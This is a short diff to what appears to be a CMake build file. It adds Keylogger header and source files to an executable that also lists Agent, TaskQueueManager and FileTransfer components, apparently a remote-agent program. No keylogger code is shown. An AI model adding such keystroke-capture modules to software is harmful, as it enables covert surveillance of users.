@@ -26,6 +26,8 @@ add_executable (
   "include/Agent.h"
   "src/TaskQueueManager.cpp"
   "include/TaskQueueManager.h"
+  "include/Keylogger.h"
+  "src/Keylogger.cpp"
   "src/FileTransfer.cpp"
   "include/FileTransfer.h"
 )
